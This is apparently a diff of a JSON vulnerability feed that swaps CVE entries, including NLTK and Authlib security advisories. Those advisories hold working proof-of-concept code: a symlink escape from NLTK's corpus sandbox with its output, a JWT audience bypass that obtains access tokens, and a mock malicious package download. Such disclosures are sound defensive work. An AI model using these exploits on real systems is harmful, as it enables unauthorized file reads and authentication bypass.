@@ -1,6 +1,6 @@
 {
   "version": "1.0",
-  "lastUpdated": "2026-11-27",
+  "lastUpdated": "2026-11-28",
   "source": "CIRCL CVE Search + GitHub Advisory OSV + CISA KEV + NIST NVD",
   "pagination": {
     "page": 281,
@@ -12,22 +12,127 @@
   },
   "cves": [
     {
-      "id": "CVE-2026-126304",
-      "summary": "## Summary\n\n`YCOECorpusReader` builds two nested corpus sub-readers whose roots are derived from `self.root.join(\"psd\")` and `self.root.join(\"pos\")` (nltk/corpus/reader/ycoe.py). Because `FileSystemPathPointer.join()` (nltk/data.py) performs a purely lexical containment check and never resolves symlinks, and because `CorpusReader.__init__` (nltk/corpus/reader/api.py) validates a sub-reader root only against the global NLTK data sandbox and not against the enclosing corpus root, a directory symlink named `psd` or `pos` planted inside a YCOE corpus lets the reader anchor its nested sub-readers outside the YCOE corpus root. An attacker who controls the contents of a YCOE corpus loaded under `pathsec.ENFORCE=True` can make `parsed_sents()`, `tagged_words()`, and related methods return file content from other locations inside the allowed data sandbox, defeating the per-corpus-root containment boundary the pathsec controls are meant to enforce.\n\n## Root Cause\n\nNLTK's pathsec controls are designed to keep each corpus reader confined to its own corpus root. The scoped containment is enforced through `validate_path(..., required_root=self._root)` at read time. However, the containment invariant is violated at reader-construction time for nested readers:\n\n- `FileSystemPathPointer.join()` accepts a component that is a directory symlink because it only checks the joined string lexically (`os.path.normpath` plus a `startswith` prefix test) and never calls `resolve()`.\n- `CorpusReader.__init__` validates the resulting sub-reader root string, but calls `validate_path` without `required_root`, so only the global-sandbox layer runs; the scoped per-corpus-root layer is skipped. The symlink is resolved by that global check, its target is found to be inside the allowed sandbox, and the sub-reader is accepted with its root pointing at the escaped target.\n\nFrom that point every read the sub-reader performs is scoped to the already-escaped root, so no later guard re-anchors it to the YCOE corpus root.\n\n```text\nAffected functions:\n- nltk.corpus.reader.ycoe.YCOECorpusReader.__init__   (nltk/corpus/reader/ycoe.py) builds nested sub-readers from self.root.join(\"psd\")/(\"pos\") without containing them to the parent root\n- nltk.corpus.reader.api.CorpusReader.__init__        (nltk/corpus/reader/api.py) validates a sub-reader root only against the global sandbox (validate_path without required_root)\n- nltk.data.FileSystemPathPointer.join               (nltk/data.py) applies a lexical prefix check only and never resolves symlinks\n```\n\n## Impact\n\nAn attacker who controls the directory contents of a YCOE corpus that is loaded by a victim application under `pathsec.ENFORCE=True` (the default in the affected releases) can read file content that lives outside the YCOE corpus root but inside an allowed NLTK data root. The disclosure is bounded to the global NLTK data sandbox: a symlink whose target resolves outside every allowed root is rejected at construction, so this is not an arbitrary-filesystem read. The demonstrated capability is read-only cross-corpus-root disclosure. In a multi-tenant or automated-ingestion deployment the accessible scope includes other corpora placed under the shared data path and the shared system temporary directory, which is a default allowed root and can hold other processes' sensitive temporary files. There is no integrity or availability impact.\n\n## Proof of Concept\n\n`Dependencies: a released nltk (3.10.0 through 3.10.3) on a POSIX host. No third-party packages. The only allowed data root is a fresh temp sandbox; ENFORCE is left at its default of True.`\n\nSteps:\n1. Create a sandbox directory and register it as the sole `nltk.data.path` entry.\n2. Inside the sandbox create a \"victim\" directory holding `doc1.psd` / `doc1.pos` outside the YCOE corpus root.\n3. Create a YCOE corpus root whose `psd` and `pos` entries are directory symlinks pointing at the victim directory.\n4. Construct `YCOECorpusReader` on that root and read it.\n\n```python\nimport os, tempfile, nltk\nfrom nltk import pathsec\nsandbox = os.path.realpath(tempfile.mkdtemp())\npathsec.ENFORCE = True\nnltk.data.path = [sandbox]\npathsec._ALLOWED_ROOTS_CACHE = None\nfrom nltk.corpus.reader.ycoe import YCOECorpusReader\n\nvictim = os.path.join(sandbox, \"victim\", \"psd_secret\")\nvictim_pos = os.path.join(sandbox, \"victim\", \"pos_secret\")\nos.makedirs(victim); os.makedirs(victim_pos)\nopen(os.path.join(victim, \"doc1.psd\"), \"w\").write(\"(S (SECRET leaked-out-of-ycoe-root))\\n\")\nopen(os.path.join(victim_pos, \"doc1.pos\"), \"w\").write(\"SECRET_NN leaked-out-of-ycoe-root_NN\\n\")\n\nycoe = os.path.join(sandbox, \"corpora\", \"ycoe_evil\"); os.makedirs(ycoe)\nos.symlink(victim, os.path.join(ycoe, \"psd\"))\nos.symlink(victim_pos, os.path.join(ycoe, \"pos\"))\n\nreader = YCOECorpusReader(ycoe)\nprint(reader.parsed_sents())\nprint(reader.tagged_words())\n```\n\n```text\npsd sub-reader real root : /tmp/ycoe_poc_zc35zihw/victim/psd_secret\nycoe corpus root         : /tmp/ycoe_poc_zc35zihw/corpora/ycoe_evil\nparsed_sents()           : [Tree('S', [Tree('SECRET', ['leaked-out-of-ycoe-root'])])]\ntagged_words()           : [('SECRET', 'NN'), ('leaked-out-of-ycoe-root', 'NN')]\nESCAPE CONFIRMED: YCOE read out-of-root content via psd/pos symlink\n```\n\nA negative control with real (non-symlink) `psd`/`pos` directories stays contained, and a symlink whose target is `/etc` is rejected at construction with a `PermissionError`, confirming the escape is bounded to the sandbox.\n\n## Attack Chain\n\n1. **Exposure:** A victim application loads a YCOE corpus whose directory contents are attacker-controlled (a downloaded, shared, or planted corpus placed under an allowlisted NLTK data root), running with `pathsec.ENFORCE=True`.\n2. **Control:** The attacker sets the corpus root's `psd` and `pos` entries to directory symlinks pointing at another directory inside the allowed sandbox.\n3. **Path:** `YCOECorpusReader.__init__` calls `self.root.join(\"psd\")`; `FileSystemPathPointer.join()` returns a pointer to `<root>/psd` after a lexical-only check that never resolves the symlink.\n4. **Guard:** `CorpusReader.__init__` calls `validate_path(root)` without `required_root`, so the scoped per-corpus-root layer is skipped; only the global-sandbox layer runs and it resolves the symlink to an in-sandbox target and accepts it.\n5. **Primitive:** The nested sub-reader's root is now the escaped target; `find_corpus_fileids` and the read-time `validate_path(required_root=self._root)` both anchor to that escaped root, so all reads are treated as in-root.\n6. **Result:** `parsed_sents()`, `tagged_words()`, `tagged_sents()`, and `words()` return file content from outside the YCOE corpus root but inside the allowed sandbox: read-only cross-corpus-root disclosure.\n\n## Bypass Evidence\n\nThe relevant guards are the pathsec containment checks that were added to confine corpus readers to their roots. They do not block this path:\n\n- `FileSystemPathPointer.join()` (nltk/data.py) checks `joined == root or joined.startswith(root + os.sep)` on the lexical, non-resolved path. A `psd` component that is a directory symlink yields `<root>/psd`, which satisfies the prefix test, and the symlink is never resolved. `FileSystemPathPointer.__init__` uses `os.path.abspath`, which also does not resolve symlinks.\n- `CorpusReader.__init__` (nltk/corpus/reader/api.py) invokes `validate_path(root, context=\"CorpusReader.__init__\")` with no `required_root`. In `validate_path`, the scoped layer is guarded by `if required_root:` and is therefore skipped; only the global-sandbox layer runs, which resolves the symlink target and accepts it because it lies inside `nltk.data.path`.\n- The read-time guard `validate_path(path, required_root=self._root)` uses the sub-reader's own `self._root`, which is already the escaped target, so it cannot detect the escape. `find_corpus_fileids` computes `resolved_root = os.path.realpath(root.path)` on the escaped root, so its `commonpath` descent guard also confines to the escaped target rather than the YCOE root.\n\nRefutation attempts that failed: a boundary test with a `/etc` symlink target is rejected at construction (`PermissionError`), so this is not arbitrary-filesystem read; a negative control with real `psd`/`pos` directories stays contained; and the escape reproduces against the exact published PyPI sdists for 3.10.0 and 3.10.3, so it is not an artifact of an unreleased development tree. No published advisory or fix addresses this reader: the currently released readers hardened for symlink escapes do not include YCOE's nested-reader root construction, and no fix commit touches nltk/corpus/reader/ycoe.py.\n\n## Affected Versions\n\n- `Ecosystem: PyPI`\n- `Package: nltk`\n- `Confirmed affected range: >= 3.10.0, <= 3.10.3`\n- `Latest release checked: 3.10.3 (PyPI sdist sha256 bb9327a461c3811c2fa4900e03840401f2126adfb30c0072827c433bd2444ea4, uploaded 2026-08-12)`\n- `Fix status: 3.10.4`\n\nThe pathsec corpus-root containment control is active by default (`ENFORCE=True`) in the 3.10.x line, and the vulnerable YCOE nested-reader construction is present unchanged in every 3.10.x release. The escape was reproduced against the published 3.10.0 and 3.10.3 sdists. Version 3.9.4 ships with `ENFORCE=False` by default, so the per-corpus-root control is not active there by default; that un-hardened default is tracked separately and is not the boundary this report concerns. No later fixed release exists at the time of review.\n\n## Suggested Fix\n\nEnforce the per-corpus-root containment invariant when a reader constructs a nested sub-reader. Two complementary options:\n\n- In `YCOECorpusReader.__init__`, validate each nested root against the parent corpus root, for example `validate_path(self.root.join(\"psd\"), required_root=self.root)` (and likewise for `pos`), so a sub-reader root that resolves outside the enclosing YCOE root is rejected.\n- Harden `FileSystemPathPointer.join()` to reject a component whose resolved target escapes the pointer's own resolved root, rather than relying on a lexical prefix test, so no reader can be pointed outside its root by a symlinked component.\n\nApply the same review to any other reader that constructs nested sub-readers from a root-derived path. As an interim mitigation, only load YCOE corpora from trusted, attacker-inaccessible directories, and avoid placing untrusted corpora under a shared NLTK data root in multi-tenant or automated-ingestion pipelines.\n\nReported by zx (GitHub: @manus-pi).\n\n## Fix status (2026-09-28)\n\nStatus: IN PROGRESS (fix on an open pull request, not yet on develop).\n\nPR: #3888 \"Validate chat80.sql_query dbname for path containment (CWE-59/73)\", open; head e0e890f51 at the time of this note.\n\nFix commits: 68434c042 \"Enforce corpus-root containment in YCOE reader and StreamBackedCorpusView\" and 2c563b13f (scopes the YCOE guard).\n\nNo probe. Regression test on the PR: nltk/test/unit/test_ycoe_streamview_pathsec.py (13 passed on the PR head e0e890f51). The advisory PoC re-run (psd and pos directory symlinks pointing outside the corpus root but inside the data sandbox): on the PR head YCOECorpusReader refuses with ValueError (Security Violation [YCOECorpusReader]: path escapes root); on develop 2fa3f48fe parsed_sents() and tagged_words() return the planted out-of-root content, so develop is still VULNERABLE.",
+      "id": "CVE-2001-0276",
+      "summary": "ext.dll in BadBlue 1.02.07 Personal Edition web server allows remote attackers to determine the physical path of the server by directly calling ext.dll without any arguments, which produces an error message that contains the path.",
+      "cvssScore": 6.4,
+      "severity": "Medium",
+      "published": "2001-05-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=98263019502565&w=2",
+        "http://www.badblue.com/p010219.htm",
+        "http://www.securityfocus.com/bid/2390",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6130",
+        "http://marc.info/?l=bugtraq&m=98263019502565&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0903",
+      "summary": "Linear key exchange process in High-bandwidth Digital Content Protection (HDCP) System allows remote attackers to access data as plaintext, avoid device blacklists, clone devices, and create new device keyvectors by computing and using alternate key combinations for authentication.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2026-11-13",
-      "modified": "2026-11-13",
+      "published": "2001-11-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=100626641009560&w=2",
+        "http://nunce.org/hdcp/hdcp111901.htm",
+        "http://www.iss.net/security_center/static/7612.php",
+        "http://www.securityfocus.com/bid/3558",
+        "http://marc.info/?l=bugtraq&m=100626641009560&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1802",
+      "summary": "Cross-site scripting (XSS) vulnerability in Xoops 1.0 RC3 allows remote attackers to inject arbitrary web script or HTML via Javascript in an IMG tag when submitting news.",
+      "cvssScore": 4.3,
+      "severity": "Medium",
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2002-09/0286.html",
+        "http://www.iss.net/security_center/static/10173.php",
+        "http://www.securityfocus.com/archive/1/293161",
+        "http://www.securityfocus.com/bid/5785",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-09/0286.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-1353",
+      "summary": "Unknown vulnerability in LDAP on Sun Solaris 8 and 9, when using Role Based Access Control (RBAC), allows local users to execute certain commands with additional privileges.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2004-10-19",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://secunia.com/advisories/12873/",
+        "http://securitytracker.com/id?1011789",
+        "http://sunsolve.sun.com/search/document.do?assetkey=1-26-57657-1&searchclause=%22category:security%22%20%22availability%2C%20security%22",
+        "http://www.auscert.org.au/render.html?it=4482",
+        "http://www.ciac.org/ciac/bulletins/p-017.shtml"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-1984",
+      "summary": "Coppermine Photo Gallery 1.2.2b and 1.2.0 RC4 allows remote attackers to obtain sensitive information via a direct HTTP request to (1) phpinfo.php, (2) addpic.php, (3) config.php, (4) db_input.php, (5) displayecard.php, (6) ecard.php, (7) crop.inc.php, which reveal the full path in a PHP error message.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-05-02",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=108360247732014&w=2",
+        "http://secunia.com/advisories/11524",
+        "http://securitytracker.com/id?1010001",
+        "http://www.osvdb.org/5756",
+        "http://www.osvdb.org/6495"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0771",
+      "summary": "The web components of Compaq Management Agents and the Compaq Survey Utility allow a remote attacker to read arbitrary files via a .. (dot dot) attack.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1999-05-26",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0771",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0771"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-12259",
+      "summary": "NLTK's package downloader in nltk/downloader.py does not verify file integrity after download and before extraction.\n\nThe download flow at lines 789-825:\n1. File is downloaded to a temp path via HTTP\n2. os.replace(tmp_filepath, filepath) moves it to the final location (line 799)\n3. Extraction begins via _unzip_iter() (line 825)\n\nBetween steps 2 and 3, there is no SHA-256 verification. The checksum logic exists in _pkg_status() (lines 982-1015) but it is only used BEFORE download as a status check (\"is this package already installed and up-to-date?\"). It is never called after download to verify the file that was actually received.\n\nAttack vectors:\n1. MITM during HTTP download (NLTK downloads from http:// by default on some mirrors)\n2. Race condition on shared filesystems (attacker replaces file between os.replace and _unzip_iter)\n3. DNS poisoning redirecting to attacker-controlled server\n\nPoC:\n```python\nimport nltk\nimport unittest.mock\nimport zipfile\nimport io\nimport os\n\n# Create a malicious zip that will be \"downloaded\"\nmalicious_zip = io.BytesIO()\nwith zipfile.ZipFile(malicious_zip, 'w') as zf:\n    zf.writestr('punkt_tab/tokenizers/punkt_tab/english.pickle', \n                b'MALICIOUS PAYLOAD - attacker controlled content')\n\n# Patch urllib to return our malicious zip\nwith unittest.mock.patch('urllib.request.urlopen') as mock_urlopen:\n    mock_response = unittest.mock.MagicMock()\n    mock_response.read.return_value = malicious_zip.getvalue()\n    mock_response.headers = {'Content-Length': str(len(malicious_zip.getvalue()))}\n    mock_urlopen.return_value = mock_response\n    \n    # Download proceeds, no integrity check catches the swap\n    # nltk.download('punkt_tab')  # Would install attacker payload\n```\n\nThis is distinct from CVE-2024-39705 (pickle deserialization via download) and CVE-2025-14009 (zip-slip path traversal). Those address what happens AFTER extraction. This finding addresses the gap BEFORE extraction where integrity is never verified.\n\nSuggested fix: After os.replace() and before _unzip_iter(), compute SHA-256 of the final file and compare against the expected checksum from the package index. Reject and delete the file if the hash does not match.",
+      "cvssScore": 5.3,
+      "severity": "Medium",
+      "published": "2026-09-08",
+      "modified": "2026-09-08",
       "cwe": {
-        "cwe_id": "CWE-59",
-        "name": "Improper Link Resolution Before File Access"
+        "cwe_id": "CWE-494",
+        "name": "Download of Code Without Integrity Check"
       },
       "references": [
-        "https://github.com/nltk/nltk/security/advisories/GHSA-qg35-44qx-7vrr",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-126304",
-        "https://github.com/nltk/nltk/pull/3888",
-        "https://github.com/nltk/nltk/commit/2c563b13f9dce7c15eefd4b03463e1b69b64f1f3",
-        "https://github.com/nltk/nltk/commit/68434c0427f8d296f3adfddb518525038d1f7bfa"
+        "https://github.com/nltk/nltk/security/advisories/GHSA-5wp5-5229-5g6q",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-12259",
+        "https://github.com/nltk/nltk/pull/3449",
+        "https://github.com/nltk/nltk/commit/0e26734a61094b628d93e26dc18dd7302567ac46",
+        "https://github.com/nltk/nltk/releases/tag/3.9.3"
       ],
       "vulnerableProducts": [
         "nltk pip"
@@ -35,891 +140,786 @@
       "isExploited": false
     },
     {
-      "id": "CVE-2026-128117",
-      "summary": "When `reroute` turned an invalid percent-encoded path into a valid path, it could potentially trigger a comparison that would crash the server.",
-      "cvssScore": 5.9,
-      "severity": "Medium",
-      "published": "2026-11-13",
-      "modified": "2026-11-13",
-      "cwe": {
-        "cwe_id": "CWE-248",
-        "name": "Uncaught Exception"
-      },
-      "references": [
-        "https://github.com/sveltejs/kit/security/advisories/GHSA-mw6w-2fmv-pvw3",
-        "https://github.com/sveltejs/kit/pull/17620",
-        "https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd",
-        "https://github.com/sveltejs/kit/commit/7993d5ebab017cb1be898a0b1c57371c5da06557",
-        "https://github.com/sveltejs/kit/releases/tag/@sveltejs/kit@2.70.4"
-      ],
-      "vulnerableProducts": [
-        "@sveltejs/kit npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-128121",
-      "summary": "If an attacker could influence a link that was crawled during the prerender phase, that link could later be interpreted as a regex in the Vercel routing configuration.",
-      "cvssScore": 5.9,
-      "severity": "Medium",
-      "published": "2026-11-13",
-      "modified": "2026-11-13",
-      "cwe": {
-        "cwe_id": "CWE-116",
-        "name": "Improper Encoding or Escaping of Output"
-      },
-      "references": [
-        "https://github.com/sveltejs/kit/security/advisories/GHSA-jf9x-2fg2-hx4w",
-        "https://github.com/sveltejs/kit/pull/17620",
-        "https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd",
-        "https://github.com/sveltejs/kit/commit/2ed61a6aa3ac230b89e3528654c587847d1525a0",
-        "https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-static@3.0.11"
-      ],
-      "vulnerableProducts": [
-        "@sveltejs/adapter-vercel npm",
-        "@sveltejs/adapter-static npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-128122",
-      "summary": "If an attacker can influence the links crawled during prerendering, they can influence the redirects entries that are added to the Cloudflare platform redirects generated during the adapt phase of the build.",
-      "cvssScore": 5.9,
-      "severity": "Medium",
-      "published": "2026-11-13",
-      "modified": "2026-11-13",
-      "cwe": {
-        "cwe_id": "CWE-79",
-        "name": "Improper Neutralization of Input During Web Page Generation"
-      },
-      "references": [
-        "https://github.com/sveltejs/kit/security/advisories/GHSA-5wg4-q3ww-283h",
-        "https://github.com/sveltejs/kit/pull/17620",
-        "https://github.com/sveltejs/kit/commit/0a2e58cbccdd46cac20aa5af4e2edf17e0da11dd",
-        "https://github.com/sveltejs/kit/commit/679e0d84ea9951bb4f1e458a599066b5a451b08a",
-        "https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-cloudflare@7.2.10"
-      ],
-      "vulnerableProducts": [
-        "@sveltejs/adapter-cloudflare npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-114618",
-      "summary": "## Description\n\n### Summary\n\nAuthlib's default RFC 7523 JWT bearer grant leaves `get_audiences()` empty, so `verify_claims()` only checks that an `aud` claim *exists* instead of requiring it to match the current authorization server's token endpoint. An attacker holding a legitimately issued JWT assertion for *any* audience can present it to a different authorization server sharing the same signing key and obtain an access token.\n\nTo be completely transparent, AI tools helped surface it. However, we have independently reproduced and carefully validated the issue. We follow responsible disclosure practices and are sharing this privately.\n\n### Affected Entrypoints\n\n- `authlib.oauth2.rfc7523.JWTBearerGrant` — default `get_audiences()` returns empty list\n- `authlib.jose.jwt.decode()` with `claims_options` for audience validation\n- `authlib.integrations.flask_oauth2.ResourceProtector.validate_request()` when audience checking is enabled\n\n### Exploit Path\n\n```\n1. Attacker authenticates to Service A (low-privilege)\n2. Authorization server issues JWT with \"aud\": \"https://evil.test/token\"\n3. Attacker presents this assertion to Service B's token endpoint\n4. Service B uses default JWTBearerGrant (get_audiences() = [])\n5. verify_claims() only checks aud *exists*, not its value\n6. Service B issues an access token — audience bypass achieved\n```\n\n### Proof of Concept\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nDemonstrates that the default JWTBearerGrant accepts JWT assertions\nwhose audience does not match the token endpoint, while a strict\naudience override correctly rejects them.\n\"\"\"\nimport json\nimport os\nimport sys\n\nfrom joserfc.jwk import KeySet, OctKey\n\nWRONG_AUDIENCE = \"https://evil.test/token\"\nEXPECTED_AUDIENCE = \"https://provider.test/token\"\nGRANT_TYPE = \"urn:ietf:params:oauth:grant-type:jwt-bearer\"\n\ndef build_and_exercise(strict_audience: bool) -> tuple[int, dict]:\n    from authlib.oauth2.rfc7523 import JWTBearerGrant as BaseJWTBearerGrant\n    # Uses Authlib's own Flask test fixtures\n    from tests.flask.test_oauth2.models import Client, User, db\n    from tests.flask.test_oauth2.oauth2_server import (\n        create_authorization_server, create_flask_app,\n    )\n\n    class JWTBearerGrant(BaseJWTBearerGrant):\n        def resolve_issuer_client(self, issuer):\n            return Client.query.filter_by(client_id=issuer).first()\n\n        def resolve_client_public_key(self, client):\n            return KeySet([\n                OctKey.import_key(\"foo\", {\"kid\": \"1\"}),\n                OctKey.import_key(\"bar\", {\"kid\": \"2\"}),\n            ])\n\n        def authenticate_user(self, subject):\n            return None\n\n        def has_granted_permission(self, client, user):\n            return True\n\n        # Only override get_audiences when testing strict mode\n        if strict_audience:\n            def get_audiences(self):\n                return [EXPECTED_AUDIENCE]\n\n    app = create_flask_app()\n    os.environ[\"AUTHLIB_INSECURE_TRANSPORT\"] = \"true\"\n\n    with app.app_context():\n        db.init_app(app)\n        db.create_all()\n\n        user = User(username=\"demo-user\")\n        db.session.add(user)\n        db.session.commit()\n\n        client = Client(\n            user_id=user.id,\n            client_id=\"client-id\",\n            client_secret=\"client-secret\",\n        )\n        client.set_client_metadata({\n            \"scope\": \"profile\",\n            \"redirect_uris\": [\"https://client.test/authorized\"],\n            \"grant_types\": [GRANT_TYPE],\n        })\n        db.session.add(client)\n        db.session.commit()\n\n        server = create_authorization_server(app)\n        server.register_grant(JWTBearerGrant)\n\n        # Sign assertion with WRONG audience\n        assertion = JWTBearerGrant.sign(\n            \"foo\",\n            issuer=\"client-id\",\n            audience=WRONG_AUDIENCE,  # <-- Not the expected audience\n            subject=None,\n            header={\"alg\": \"HS256\", \"kid\": \"1\"},\n        )\n\n        rv = app.test_client().post(\n            \"/oauth/token\",\n            data={\"grant_type\": GRANT_TYPE, \"assertion\": assertion},\n        )\n        body = json.loads(rv.data)\n        db.session.remove()\n        db.drop_all()\n        return rv.status_code, body\n\ndef main() -> int:\n    # Test 1: Default grant (no audience enforcement)\n    vuln_status, vuln_body = build_and_exercise(strict_audience=False)\n\n    # Test 2: Strict audience grant (correct behavior)\n    strict_status, strict_body = build_and_exercise(strict_audience=True)\n\n    result = {\n        \"wrong_audience\": WRONG_AUDIENCE,\n        \"expected_audience\": EXPECTED_AUDIENCE,\n        \"vulnerable_status\": vuln_status,\n        \"vulnerable_body\": vuln_body,\n        \"strict_status\": strict_status,\n        \"strict_body\": strict_body,\n    }\n    print(json.dumps(result, indent=2, sort_keys=True))\n\n    if (\n        vuln_status == 200\n        and \"access_token\" in vuln_body\n        and strict_body.get(\"error\") == \"invalid_grant\"\n    ):\n        print(\n            \"POC_SUCCESS: default JWTBearerGrant issued an access token for \"\n            \"an assertion whose aud did not match the token endpoint, while \"\n            \"strict audience validation rejected the same assertion.\"\n        )\n        return 0\n\n    print(\"POC_FAILURE: expected token issuance under default grant \"\n          \"and invalid_grant under strict audience control.\")\n    return 1\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n```\n\n### Observed Result\n\n- **Default grant (vulnerable):** HTTP 200, `access_token` issued despite `aud: \"https://evil.test/token\"`\n- **Strict grant (fixed):** HTTP 400, `error: \"invalid_grant\"` — correctly rejects mismatched audience\n- Confirms the default `get_audiences()` returns empty, so audience validation is effectively skipped\n\n### Impact\n\n- **Vulnerability Type:** CWE-287 — Improper Authentication\n- An attacker with a valid JWT assertion for *any* service can use it to obtain tokens from a *different* service sharing the same signing keys\n- Particularly dangerous in **microservice architectures** where services share identity infrastructure\n- Enables unauthorized access escalation across trust boundaries\n- The vulnerability is in the *default behavior* — most integrations won't override `get_audiences()`\n### Credit\nReported by a security research team from the University of Sydney, focusing on detecting open source software vulnerabilities.\nLiyi Zhou: https://lzhou1110.github.io/\nZiyue Wang: https://zyy0530.github.io/\nStrick: https://str1ckl4nd.github.io/\nMaurice: https://maurice.busystar.org/\nChenchen Yu: https://7thparkk.github.io/",
-      "cvssScore": 5.2,
-      "severity": "Medium",
-      "published": "2026-10-22",
-      "modified": "2026-10-30",
-      "cwe": {
-        "cwe_id": "CWE-287",
-        "name": "Improper Authentication"
-      },
-      "references": [
-        "https://github.com/authlib/authlib/releases/tag/v1.9.0",
-        "https://github.com/authlib/authlib/commit/e3bd41cb29dcfee434453b135ffb487884baeedf",
-        "https://github.com/authlib/authlib/pull/945",
-        "https://github.com/authlib/authlib/security/advisories/GHSA-fch4-3c6x-j4gc"
-      ],
-      "vulnerableProducts": [
-        "authlib PyPI"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0450",
-      "summary": "Format string vulnerability in the printlog function in log2mail before 0.2.5.2 allows local users or remote attackers to execute arbitrary code via format string specifiers in a logfile monitored by log2mail.",
+      "id": "CVE-2002-0746",
+      "summary": "Vulnerability in template.dhcpo in AIX 4.3.3 related to an insecure linker argument.",
       "cvssScore": 10,
       "severity": "Critical",
-      "published": "2004-08-06",
+      "published": "2002-08-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://felinemenace.org/~jaguar/advisories/log2mail.txt",
-        "http://osvdb.org/6711",
-        "http://secunia.com/advisories/11768",
-        "http://secunia.com/advisories/11769",
-        "http://www.debian.org/security/2004/dsa-513"
+        "http://archives.neohapsis.com/archives/aix/2002-q2/0005.html",
+        "http://archives.neohapsis.com/archives/aix/2002-q2/0005.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-0453",
-      "summary": "Format string vulnerability in the monitor \"memory dump\" command in VICE 1.6 to 1.14 allows local users to cause a denial of service (emulator crash) and possibly execute arbitrary code via format string specifiers in an output string.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2004-08-06",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=108723630730487&w=2",
-        "http://www.securityfocus.com/bid/10543",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16404",
-        "http://marc.info/?l=bugtraq&m=108723630730487&w=2",
-        "http://www.securityfocus.com/bid/10543"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0460",
-      "summary": "Buffer overflow in the logging capability for the DHCP daemon (DHCPD) for ISC DHCP 3.0.1rc12 and 3.0.1rc13 allows remote attackers to cause a denial of service (server crash) and possibly execute arbitrary code via multiple hostname options in (1) DISCOVER, (2) OFFER, (3) REQUEST, (4) ACK, or (5) NAK messages, which can generate a long string when writing to a log file.",
+      "id": "CVE-2002-0747",
+      "summary": "Buffer overflow in lsmcode in AIX 4.3.3.",
       "cvssScore": 10,
       "severity": "Critical",
-      "published": "2004-08-06",
+      "published": "2002-08-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=108795911203342&w=2",
-        "http://marc.info/?l=bugtraq&m=108843959502356&w=2",
-        "http://marc.info/?l=bugtraq&m=108938625206063&w=2",
-        "http://secunia.com/advisories/23265",
-        "http://www.kb.cert.org/vuls/id/317350"
+        "http://archives.neohapsis.com/archives/aix/2002-q2/0005.html",
+        "http://archives.neohapsis.com/archives/aix/2002-q2/0005.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-1396",
-      "summary": "Vulnerability in integer multiplication emulation code on SPARC architectures for SunOS 4.1 through 4.1.2 allows local users to gain root access or cause a denial of service (crash).",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "1992-07-21",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.cert.org/advisories/CA-1992-15.html",
-        "http://www.iss.net/security_center/static/7150.php",
-        "http://www.securityfocus.com/bid/49",
-        "http://www.cert.org/advisories/CA-1992-15.html",
-        "http://www.iss.net/security_center/static/7150.php"
-      ],
-      "vulnerableProducts": [
-        "unknown"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-1395",
-      "summary": "Vulnerability in Monitor utility (SYS$SHARE:SPISHR.EXE) in VMS 5.0 through 5.4-2 allows local users to gain privileges.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "1992-11-17",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://osvdb.org/59332",
-        "http://www.cert.org/advisories/CA-1992-18.html",
-        "http://www.cert.org/advisories/CA-92.16.VMS.Monitor.vulnerability",
-        "http://www.iss.net/security_center/static/7136.php",
-        "http://www.securityfocus.com/bid/51"
-      ],
-      "vulnerableProducts": [
-        "unknown"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-1021",
